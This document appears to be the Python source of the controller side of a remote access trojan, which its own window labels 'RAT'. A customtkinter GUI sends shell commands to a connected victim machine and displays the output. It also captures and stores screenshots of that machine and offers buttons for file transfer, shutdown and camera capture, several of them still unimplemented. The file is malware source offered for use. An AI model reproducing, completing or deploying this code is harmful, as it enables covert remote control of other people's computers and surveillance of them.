# the same as alpha 1.4, but with a gui for the server
import customtkinter as ctk
import socket
import threading
import time
import sys
import os
import json
from PIL import Image

inhalte = []

def action_cmdcommand(client: socket.socket, content: ctk.CTkFrame):
    global inhalte
    if len(inhalte) > 0:
        for item in inhalte:
            item.destroy()
        inhalte = []
    
    output_field = ctk.CTkTextbox(content, height=300, width=500)
    output_field.pack(expand=True, pady=10, padx=10)
    inhalte.append(output_field)
    
    input_cmd = ctk.CTkEntry(content, placeholder_text='Command', width=500)
    input_cmd.pack(expand=True, side='left', pady=10, padx=10)
    inhalte.append(input_cmd)
    
    send_cmd_button = ctk.CTkButton(content, text='Send CMD', command=lambda: action_cmdcommand_sendcmd(client, input_cmd, output_field))
    send_cmd_button.pack(side='right', pady=10, padx=10)
    inhalte.append(send_cmd_button)

def action_cmdcommand_sendcmd(client: socket.socket, input_cmd, outputfield: ctk.CTkTextbox):
    cmd = input_cmd.get()
    if cmd == '':
        cmd = 'cd'
    client.send('cmd'.encode())
    client.send(cmd.encode())
    output = client.recv(1024).decode()
    outputfield.delete(index1='1.0', index2='end')
    outputfield.insert(index='1.0', text=output)
    input_cmd.delete(first_index='0', last_index='end')


def action_screenshot(client: socket.socket, content: ctk.CTkFrame):
    global inhalte
    if len(inhalte) > 0:
        for item in inhalte:
            item.destroy()
        inhalte = []

    # set the screenshot in the middle of the screen
    # in the bottom left corner is a select menu and the selected screenshot show in the middle
    # in the bottom right corner is a button to take a new screenshot

    # get the first screenshot in assets/screenshots --if not available, make a black field
    global screenshots
    screenshots = []
    for file in os.listdir(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots')):
        if file.endswith('.png'):
            screenshots.append(file)
    if len(screenshots) == 0:
        action_screenshot_take(client, content)

    # get the first screenshot
    screenshot = ctk.CTkLabel(master=content, text='', image=ctk.CTkImage(Image.open(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots', screenshots[0])), size=(500, 300)))
    screenshot.pack(pady=10, padx=20, side='top')
    inhalte.append(screenshot)

    # get the select menu
    select_menu = ctk.CTkComboBox(content, values=screenshots, width=200)
    select_menu.pack(pady=10, padx=20, side='left')
    inhalte.append(select_menu)

    # get the button to show the selected screenshot
    show_selected_screenshot_button = ctk.CTkButton(content, text='Show Selected Screenshot', command=lambda: action_show_selected_screenshot(content, select_menu, screenshot))
    show_selected_screenshot_button.pack(pady=10, padx=20, side='right')
    inhalte.append(show_selected_screenshot_button)

    # get the button to take a new screenshot
    take_screenshot_button = ctk.CTkButton(content, text='Take Screenshot', command=lambda: action_screenshot_take(client, content))
    take_screenshot_button.pack(pady=10, padx=20, side='right')
    inhalte.append(take_screenshot_button)

def action_screenshot_take(client: socket.socket, content: ctk.CTkFrame):
    client.send('screenshot'.encode())
    data = client.recv(10240000)
    count = json.load(open('config.json', 'r'))['screenshot_count']
    with open(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots', f'screenshot_{count}.png'), 'wb') as file:
        file.write(data)
    count += 1
    json.dump({'screenshot_count': count}, open('config.json', 'w'))
    action_screenshot(client, content)

def action_show_selected_screenshot(content: ctk.CTkFrame, select_menu: ctk.CTkComboBox, screenshot: ctk.CTkLabel):
    screenshot.configure(image=ctk.CTkImage(Image.open(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots', select_menu.get())), size=(500, 300)))
    # global inhalte
    # # get the selected screenshot
    # screenshot = ctk.CTkLabel(master=content, image=ctk.CTkImage(Image.open(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots', select_menu.get())), size=(500, 300)))
    # # show the screenshot and destroy the old one
    # inhalte[0].destroy()
    # inhalte[0] = screenshot
    # screenshot.pack(pady=10, padx=20, side='top')


def action_camera_image(client: socket.socket, content: ctk.CTkFrame):
    ...


def gui(client: socket.socket, addr):
    ctk.set_appearance_mode('dark')
    ctk.set_default_color_theme('dark-blue')
    
    global root
    root = ctk.CTk()
    root.title(f'Client: {addr}')
    root.iconbitmap(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'icon.png'))
    root.geometry('900x450')
    root.resizable(False, False)
    
    menu = ctk.CTkFrame(root)
    menu.pack(fill='both', expand=False, side='left')
    
    content = ctk.CTkFrame(root, height=450, width=700)
    content.pack(pady=20, padx=20, fill='both', expand=True, side='right')
    
    title = ctk.CTkLabel(menu, text='RAT', font=('Robot', 24))
    title.pack(pady=10, padx=20)
    
    buttons = [
        ctk.CTkButton(menu, text='CMD Command', command=lambda: action_cmdcommand(client, content)),
        ctk.CTkButton(menu, text='Shutdown'),
        ctk.CTkButton(menu, text='Restart'),
        ctk.CTkButton(menu, text='Logout'),
        ctk.CTkButton(menu, text='Put File'),
        ctk.CTkButton(menu, text='Get File'),
        ctk.CTkButton(menu, text='Screenshot', command=lambda: action_screenshot(client, content)),
        ctk.CTkButton(menu, text='Camera Image', command=lambda: action_camera_image(client, content)),
        ctk.CTkButton(menu, text='Camera Livestream')
    ]
    
    for button in buttons:
        button.pack(pady=10, padx=20)
    
    root.mainloop()

def handle_connection(client: socket.socket, addr):
    print(f'Client connected: {addr}')
    try:
        gui(client=client, addr=addr)
    except:
        print(f'Client disconnected: {addr}')
    finally:
        client.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', 1234))
    s.listen(1)
    print('Waiting for connections...')
    
    while True:
        client, addr = s.accept()
        threading.Thread(target=handle_connection, args=(client, addr)).start()

if __name__ == '__main__':
    main()